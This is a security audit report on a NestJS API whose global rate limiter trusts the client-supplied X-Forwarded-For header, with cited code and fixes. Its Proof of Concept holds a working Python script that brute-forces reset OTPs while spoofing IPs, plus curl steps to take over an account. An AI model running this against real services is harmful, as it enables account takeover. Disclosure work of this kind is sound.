### Title
Global IP Rate Limiter Bypass via Attacker-Controlled `X-Forwarded-For` Header Enables Brute Force on All API Endpoints

### Summary
The global `IpThrottlerGuard` — the sole rate-limiting defense applied to every API route — derives its tracker key from the raw `X-Forwarded-For` HTTP header before falling back to `req.ip`. Because this header is fully attacker-controlled, any unauthenticated client can rotate through arbitrary fake IP strings to bypass the rate limit entirely. In production, `trust proxy` is enabled globally, making the application accept and act on this header unconditionally. The `/auth/verify-reset` OTP endpoint has no secondary (email-based) throttler, so a bypassed IP throttler leaves OTP brute force completely unmitigated.

### Finding Description

**Root cause — `IpThrottlerGuard.getTracker` trusts a client-supplied header:**

```typescript
// back-end/apps/api/src/guards/ip-throttler.guard.ts
protected getTracker(req: Record<string, any>): Promise<string> {
  const clientIp = req.headers['x-forwarded-for'] || req.ip;
  ...
  return clientIp;
}
``` [1](#0-0) 

The tracker key is the raw string value of `req.headers['x-forwarded-for']`. This header is set by the HTTP client, not by a trusted proxy. An attacker simply sends `X-Forwarded-For: <arbitrary-string>` and the throttler counts that string as the "IP", not the real source address.

**Production amplifier — `trust proxy` is unconditionally enabled:**

```typescript
// back-end/apps/api/src/main.ts
async function createAppForDeployment(): Promise<NestExpressApplication> {
  const app = (await NestFactory.create(ApiModule)) as NestExpressApplication;
  app.enable('trust proxy');
  return app;
}
``` [2](#0-1) 

`app.enable('trust proxy')` with no hop count or allowlist tells Express to trust the entire `X-Forwarded-For` chain from any source. This does not fix the guard — the guard reads `req.headers['x-forwarded-for']` directly (the raw header string), bypassing Express's own proxy-trust resolution of `req.ip`.

**Global guard registration — bypass affects every route:**

```typescript
// back-end/apps/api/src/api.module.ts
providers: [
  {
    provide: APP_GUARD,
    useClass: IpThrottlerGuard,   // applied globally
  },
  ...
]
``` [3](#0-2) 

`IpThrottlerGuard` is the only rate limiter applied globally. The `EmailThrottlerGuard` is applied only to `/auth/signup`, `/auth/login`, and `/auth/reset-password`.

**Unprotected OTP endpoint — `/auth/verify-reset` has no secondary throttler:**

```typescript
// back-end/apps/api/src/auth/auth.controller.ts
@Post('/verify-reset')
@HttpCode(200)
@UseGuards(JwtBlackListOtpGuard, OtpJwtAuthGuard)   // no throttler
async verifyOtp(@GetUser() user: User, @Body() dto: OtpDto, @Req() req) {
``` [4](#0-3) 

The OTP is an 8-digit TOTP with `window: 20` and `step: 60` seconds, meaning up to 41 valid codes exist at any moment across a ±20-step window.

```typescript
// back-end/apps/api/src/auth/auth.service.ts
totp.options = {
  digits: 8,
  step: 60,
  window: 20,
};
``` [5](#0-4) 

With the IP throttler bypassed, an attacker can submit unlimited OTP guesses against a victim's reset token.

### Impact Explanation

**Brute force on `/auth/verify-reset`:** An attacker who triggers a password reset for a target account (publicly reachable via `/auth/reset-password`) receives a JWT OTP token. With the IP throttler bypassed, they can enumerate all 8-digit values (10^8 space, 41 valid at any moment) against `/auth/verify-reset` without restriction. A successful guess yields a `verified: true` OTP JWT, allowing the attacker to call `/auth/set-password` and take over the account — full account takeover with no privileged access required.

**Brute force on `/auth/login`:** The `EmailThrottlerGuard` on `/auth/login` tracks by `req.body.email`. An attacker targeting a single account is still limited per-email. However, with the IP throttler bypassed, an attacker can spray credentials across many accounts simultaneously without any IP-level cap.

**DoS on resource-intensive endpoints:** Any endpoint (e.g., transaction creation, key operations) can be flooded without IP-level throttling, causing resource exhaustion.

Impact: **4 / 5** — account takeover is achievable with no privileged access.

### Likelihood Explanation

Setting an arbitrary `X-Forwarded-For` header requires only a standard HTTP client (`curl`, Python `requests`, etc.). No authentication, no leaked secrets, no internal network access is needed. The attacker only needs to know a target's email address to initiate the OTP flow. The attack is fully scriptable and deterministic.

Likelihood: **4 / 5** — trivially reachable by any external attacker.

### Recommendation

1. **Fix `IpThrottlerGuard.getTracker` to use `req.ip` exclusively.** When `trust proxy` is correctly configured with a specific hop count or CIDR allowlist, Express sets `req.ip` to the first untrusted (real) client IP. Do not read `req.headers['x-forwarded-for']` directly.

```typescript
protected getTracker(req: Record<string, any>): Promise<string> {
  const clientIp = req.ip;
  if (!clientIp) {
    throw new HttpException('Unable to determine client IP', HttpStatus.INTERNAL_SERVER_ERROR);
  }
  return Promise.resolve(clientIp);
}
```

2. **Restrict `trust proxy` to the actual proxy hop count** (e.g., `app.set('trust proxy', 1)` if behind a single load balancer), so Express correctly resolves `req.ip` and ignores attacker-injected headers.

3. **Add `EmailThrottlerGuard` (or a dedicated IP throttler) to `/auth/verify-reset` and `/auth/set-password`** to provide a secondary defense independent of IP tracking.

### Proof of Concept

**Preconditions:** Target user email is known (e.g., `victim@example.com`). Attacker has no credentials.

**Step 1 — Trigger OTP issuance:**
```bash
curl -X POST https://api.example.com/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'
# Response: { "token": "<OTP_JWT>" }
```

**Step 2 — Brute force OTP, rotating `X-Forwarded-For` to bypass the IP throttler:**
```python
import requests, itertools

OTP_JWT = "<OTP_JWT from step 1>"
url = "https://api.example.com/auth/verify-reset"

for i, code in enumerate(range(0, 100_000_000)):
    fake_ip = f"10.{(i>>16)&0xff}.{(i>>8)&0xff}.{i&0xff}"
    resp = requests.post(url,
        json={"token": f"{code:08d}"},
        headers={
            "Authorization": f"Bearer {OTP_JWT}",
            "X-Forwarded-For": fake_ip,
        }
    )
    if resp.status_code == 200:
        verified_jwt = resp.json()["token"]
        print(f"OTP found: {code:08d}, verified JWT: {verified_jwt}")
        break
```

**Step 3 — Set attacker-chosen password:**
```bash
curl -X PATCH https://api.example.com/auth/set-password \
  -H "Authorization: Bearer <verified_jwt>" \
  -H "Content-Type: application/json" \
  -d '{"password":"attacker_password"}'
```

**Expected outcome:** The attacker sets a new password for the victim account and gains full access. The IP throttler never triggers because each request presents a different `X-Forwarded-For` value, and `/auth/verify-reset` has no email-based secondary throttler.

### Citations

**File:** back-end/apps/api/src/guards/ip-throttler.guard.ts (L7-13)
```typescript
  protected getTracker(req: Record<string, any>): Promise<string> {
    const clientIp = req.headers['x-forwarded-for'] || req.ip;
    if (!clientIp) {
      throw new HttpException('Unable to determine client IP', HttpStatus.INTERNAL_SERVER_ERROR);
    }
    // console.log('client IP', clientIp.replace(/^.*:/, ''));
    return clientIp;
```

**File:** back-end/apps/api/src/main.ts (L32-37)
```typescript
async function createAppForDeployment(): Promise<NestExpressApplication> {
  const app = (await NestFactory.create(ApiModule)) as NestExpressApplication;
  app.enable('trust proxy');

  return app;
}
```

**File:** back-end/apps/api/src/api.module.ts (L73-82)
```typescript
  providers: [
    {
      provide: APP_GUARD,
      useClass: IpThrottlerGuard,
    },
    {
      provide: APP_GUARD,
      useClass: FrontendVersionGuard,
    },
    LoggerMiddleware,
```

**File:** back-end/apps/api/src/auth/auth.controller.ts (L152-159)
```typescript
  @Post('/verify-reset')
  @HttpCode(200)
  @UseGuards(JwtBlackListOtpGuard, OtpJwtAuthGuard)
  async verifyOtp(@GetUser() user: User, @Body() dto: OtpDto, @Req() req) {
    const result = await this.authService.verifyOtp(user, dto);
    await this.blacklistService.blacklistToken(extractJwtOtp(req));
    return result;
  }
```

**File:** back-end/apps/api/src/auth/auth.service.ts (L30-34)
```typescript
totp.options = {
  digits: 8,
  step: 60,
  window: 20,
};
```
